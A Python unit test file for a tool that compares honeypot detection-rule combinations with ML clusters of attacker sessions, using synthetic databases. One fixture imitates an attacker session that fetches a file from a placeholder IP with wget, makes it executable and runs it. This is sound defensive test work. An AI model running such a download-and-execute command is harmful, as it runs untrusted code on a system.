"""규칙 조합 × ML 군집 교차 분석 테스트. 모든 데이터는 테스트용 합성 데이터이며 실제 DB는 읽지 않는다."""
from contextlib import closing
from hashlib import sha256
import json
from pathlib import Path
import sqlite3
import tempfile
import unittest

from ml.analysis import rule_combo_clusters as R

ML_SCHEMA = """
CREATE TABLE sessions (source TEXT, session_id TEXT, sensor TEXT, src_ip TEXT, country TEXT, protocol TEXT,
    client_version TEXT, start_ts TEXT, end_ts TEXT, login_success INTEGER DEFAULT 0, username TEXT, password TEXT,
    n_commands INTEGER DEFAULT 0, n_failed INTEGER DEFAULT 0, excluded INTEGER DEFAULT 0, PRIMARY KEY (source, session_id));
CREATE TABLE commands (source TEXT, session_id TEXT, ts TEXT, command TEXT);
CREATE TABLE ml_clusters (source TEXT, session_id TEXT, protocol TEXT, model TEXT, params TEXT, cluster_id INTEGER,
    is_noise INTEGER, outlier_score REAL, probability REAL, assigned_by TEXT, assigned_at TEXT, PRIMARY KEY (source, session_id));
CREATE TABLE ml_meta (key TEXT PRIMARY KEY, value TEXT);
"""
DASH_SCHEMA = """
CREATE TABLE hits (source TEXT, session_id TEXT, rule_id TEXT, first_ts TEXT, n_hits INTEGER, PRIMARY KEY (source, session_id, rule_id));
CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT);
CREATE TABLE sources (source TEXT PRIMARY KEY, db TEXT, has_raw_logs INTEGER, first_event TEXT, last_event TEXT, imported_at TEXT, note TEXT);
"""


def build(data_dir, sessions):
    """sessions: (source, sid, protocol, cluster_id, [rules], [commands])"""
    with closing(sqlite3.connect(data_dir / "ml.db")) as ml, closing(sqlite3.connect(data_dir / "dashboard.db")) as dash:
        ml.executescript(ML_SCHEMA)
        dash.executescript(DASH_SCHEMA)
        for i, (source, sid, proto, cid, rules, cmds) in enumerate(sessions):
            ml.execute("INSERT INTO sessions (source, session_id, src_ip, protocol, n_commands) VALUES (?,?,?,?,?)",
                       (source, sid, f"10.0.{i // 250}.{i % 250 + 1}", proto, len(cmds)))
            for j, c in enumerate(cmds):
                ml.execute("INSERT INTO commands VALUES (?,?,?,?)", (source, sid, f"2026-01-01T00:00:{j:02d}Z", c))
            ml.execute("INSERT INTO ml_clusters VALUES (?,?,?,'hdbscan','p',?,?,0,1,'fit','t')",
                       (source, sid, proto, cid, int(cid == -1)))
            for r in rules:
                dash.execute("INSERT INTO hits VALUES (?,?,?,?,1)", (source, sid, r, "t"))
        ml.executemany("INSERT INTO ml_meta VALUES (?,?)", [("trained_at", "T"), ("params", "p"), ("normalize_version", "3")])
        dash.executemany("INSERT INTO meta VALUES (?,?)", [("rules_sha256", "x"), ("rules_commit", "c"), ("built_at", "b")])
        dash.execute("INSERT INTO sources VALUES ('seoul','', 1, 'a', 'b', 't', '')")
        ml.commit()
        dash.commit()


def digest(path):
    return sha256(Path(path).read_bytes()).hexdigest()


class RuleComboClusterTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.data = Path(self.tmp.name) / "data"
        self.data.mkdir()
        self.out = Path(self.tmp.name) / "out"
        wget = ["uname -a", "wget http://1.2.3.4/a -O /tmp/a", "chmod 777 /tmp/a", "/tmp/a"]
        probe = ["cat /proc/cpuinfo", "free -m"]
        s = []
        # (telnet, A+B) 이 군집 0·1·노이즈에 나뉜다. 순서는 일부러 섞는다
        for i in range(4):
            s.append(("seoul", f"a{i}", "telnet", 0, ["B2", "B1"], wget))
        for i in range(3):
            s.append(("syd", f"b{i}", "telnet", 1, ["B1", "B2"], probe))
        s.append(("syd", "n0", "telnet", -1, ["B1", "B2"], probe))
        # 조합 B1 하나뿐 -> 군집 0 하나, 노이즈 없음
        for i in range(3):
            s.append(("seoul", f"c{i}", "ssh", 0, ["B1"], ["id"]))
        # 시그니처 없는 세션 (서로 다른 군집)
        s.append(("seoul", "z0", "telnet", 0, [], ["echo hi"]))
        s.append(("seoul", "z1", "telnet", 1, [], ["echo hello"]))
        # B19만 일치 -> 제외 분석에서 (only-ignored)
        s.append(("seoul", "g0", "telnet", 1, ["B19"], ["sh"]))
        build(self.data, s)
        self.rules = Path(self.tmp.name) / "rules.yaml"
        self.rules.write_text("rules: []\n", encoding="utf-8")

    def run_tool(self, *extra):
        R.main(["--data-dir", str(self.data), "--out", str(self.out), "--rules", str(self.rules), *extra])

    def rows(self, **kw):
        with closing(R.open_readonly(self.data)) as con:
            rows = R.load_rows(con)
        return R.analyze(rows, **kw)

    def test_combo_is_sorted_and_deduplicated(self):
        self.assertEqual(R.combo_of(frozenset({"B2", "B1"})), "B1+B2")
        self.assertEqual(R.combo_of(frozenset()), R.NO_HITS)
        self.assertEqual(R.combo_of(frozenset({"B19"}), frozenset({"B19"})), R.ONLY_IGNORED)
        self.assertEqual(R.combo_of(frozenset({"B19", "B1"}), frozenset({"B19"})), "B1")

    def test_multi_cluster_case_and_noise_separate(self):
        cluster_rows, pairs, summary = self.rows()
        by = {(r["protocol"], r["rule_combo"], r["cluster_id"]): r for r in cluster_rows}
        self.assertEqual(by[("telnet", "B1+B2", 0)]["case"], R.CASE_MULTI)
        self.assertEqual(by[("telnet", "B1+B2", 0)]["sessions"], 4)
        self.assertEqual(by[("telnet", "B1+B2", 1)]["sessions"], 3)
        noise = by[("telnet", "B1+B2", -1)]
        self.assertEqual((noise["sessions"], noise["is_noise"]), (1, 1))
        self.assertEqual(by[("ssh", "B1", 0)]["case"], R.CASE_ONE)
        self.assertEqual(by[("telnet", "B1+B2", 0)]["seoul"], 4)
        self.assertEqual(by[("telnet", "B1+B2", 1)]["syd"], 3)

    def test_noise_is_not_counted_as_a_cluster(self):
        rows = [dict(source="s", session_id=str(i), protocol="ssh", cluster_id=c, is_noise=c < 0,
                     rules=frozenset({"B1"}), seq=("id",), ip="1.1.1.1") for i, c in enumerate([0, 0, -1])]
        _, pairs, summary = R.analyze(rows)
        self.assertEqual(summary["cases"], {R.CASE_ONE_PLUS_NOISE: 1})
        self.assertEqual(pairs, [])

    def test_sessions_without_hits_counted_separately(self):
        _, _, summary = self.rows()
        self.assertEqual(summary["sessions_without_hits"], 2)
        self.assertEqual(summary["ml_sessions"], 14)
        self.assertEqual(sorted(r["cluster_id"] for r in summary["no_hit_by_cluster"]), [0, 1])

    def test_pair_comparison_detects_different_flows(self):
        _, pairs, _ = self.rows()
        self.assertEqual(len(pairs), 1)
        p = pairs[0]
        self.assertEqual((p["cluster_a"], p["cluster_b"]), (0, 1))
        self.assertIn("wget", p["only_in_a"].split())
        self.assertIn("free", p["only_in_b"].split())
        self.assertEqual(p["same_top_seq"], 0)
        self.assertIn("확인 필요", p["review_hint"])
        self.assertNotIn("신규", p["review_hint"])

    def test_min_sessions_filters_pairs_but_keeps_clusters(self):
        cluster_rows, pairs, _ = self.rows(min_sessions=4)
        self.assertEqual(pairs, [])
        self.assertTrue(any(r["cluster_id"] == 1 and r["rule_combo"] == "B1+B2" for r in cluster_rows))

    def test_ignore_rules_changes_combo(self):
        cluster_rows, _, summary = self.rows(ignore=frozenset({"B19"}))
        self.assertTrue(any(r["rule_combo"] == R.ONLY_IGNORED for r in cluster_rows))
        self.assertEqual(summary["ignored_rules"], ["B19"])

    def test_original_databases_are_not_modified(self):
        before = {n: digest(self.data / n) for n in ("ml.db", "dashboard.db")}
        self.run_tool()
        self.assertEqual(before, {n: digest(self.data / n) for n in ("ml.db", "dashboard.db")})
        self.assertEqual(sorted(p.name for p in self.data.iterdir()), ["dashboard.db", "ml.db"])

    def test_connection_is_read_only(self):
        with closing(R.open_readonly(self.data)) as con:
            with self.assertRaises(sqlite3.OperationalError):
                con.execute("DELETE FROM ml_clusters")
            with self.assertRaises(sqlite3.OperationalError):
                con.execute("DELETE FROM dash.hits")

    def test_outputs_and_meta(self):
        self.run_tool()
        names = {p.name for p in self.out.iterdir()}
        self.assertTrue({"combo_clusters.csv", "combo_comparison.csv", "report.md", "run_meta.json",
                         "combo_clusters_ignoring_B19.csv", "report_ignoring_B19.md"} <= names)
        meta = json.loads((self.out / "run_meta.json").read_text(encoding="utf-8"))
        self.assertEqual(meta["ml"]["normalize_version"], "3")
        self.assertFalse(meta["rules_match_db"])
        report = (self.out / "report.md").read_text(encoding="utf-8")
        self.assertIn("확인할 후보", report)
        self.assertIn("정확도가 아니다", report)
        self.assertIn("불일치", report)

    def test_report_table_cells_escape_pipe(self):
        rows = [dict(source="s", session_id=f"{c}{i}", protocol="ssh", cluster_id=c, is_noise=False,
                     rules=frozenset({"B1"}), seq=seq, ip="1.1.1.1")
                for c, seq in ((0, ("a|b",)), (1, ("c",))) for i in range(3)]
        cluster_rows, pairs, summary = R.analyze(rows)
        meta = {"data_dir": "x", "ml": {}, "dashboard": {}, "sources": [], "rules_match_db": True}
        report = R.render_report(meta, summary, cluster_rows, pairs, "t")
        pair_line = next(l for l in report.splitlines() if l.startswith("| 0 vs 1"))
        self.assertEqual(pair_line.count("|"), 8)  # 7칸 표 → 구분자 8개. 명령어의 '|'가 칸을 깨지 않아야 한다

    def test_ignore_can_be_disabled(self):
        self.run_tool("--ignore-rules", "")
        self.assertFalse((self.out / "report_ignoring_B19.md").exists())

    def test_output_inside_data_dir_is_refused(self):
        with self.assertRaises(SystemExit):
            R.main(["--data-dir", str(self.data), "--out", str(self.data / "out"), "--rules", str(self.rules)])


if __name__ == "__main__":
    unittest.main()
